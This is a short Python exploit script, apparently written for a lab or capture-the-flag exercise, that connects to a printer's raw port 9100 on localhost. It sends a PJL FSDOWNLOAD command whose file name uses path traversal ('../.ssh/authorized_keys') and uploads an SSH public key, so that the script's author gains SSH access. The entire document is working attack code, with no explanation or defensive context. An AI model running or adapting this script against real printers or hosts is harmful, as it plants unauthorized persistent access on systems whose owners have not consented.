#!/usr/bin/env python3
import socket

HOST = "127.0.0.1"
PORT = 9100

# Your public key (one line)
PUBLIC_KEY = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgjiqDx6bT/QwTZfkBpfea/ES8Op6XdGvLrItbxhYIJYfOqP2Lhtm7ygfuac6bjbRCs+tybz6SzPk2YM3NwnEeiT3QeIsWH4q9oIFBLtOkvmyUfW4rX9ZghS6Pj7WsWlGd6DKR4CErUQiJ1dipyb9zGuo8V4vIVeSjtZnuBxL6k+cVoPRhI9U6mj/xILdmlQIsB9MRe+3SNXNh6Y4LP/RpoI0WHeGf+5W38EjIME9d0PyAGL0kJc1neK+Y9IX8EEt2L1tbt9zr0XG+CSTlPGt6oY10MP1vyVnrxqeGc/aSfwVDaMkc0z+cvSLPfLksvnOe05F4L0e39sptxw94MU+GvAuSCRUQNRoSZsFMA80UuV2qdS7CxgvSIZ5t1Wz+M9EDYhvENHKhRN+5/9IWdF5q4V/MQE1qGgWXUdYclNCeJaxy0Cbvpyydfgw9IGrazj2PIT54QoX7la/s1eTjUY/iEhQIJBI6kC6Zo6pTDKjO7/eFmfBnUYBMnK9UFx3Cd00= madhav@madhav\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = f"@PJL FSDOWNLOAD NAME=\"../.ssh/authorized_keys\" SIZE={len(PUBLIC_KEY)}\n".encode()
s.send(cmd)
s.send(PUBLIC_KEY)
resp = s.recv(1024)
print(f"[+] Response: {resp}")
s.close()
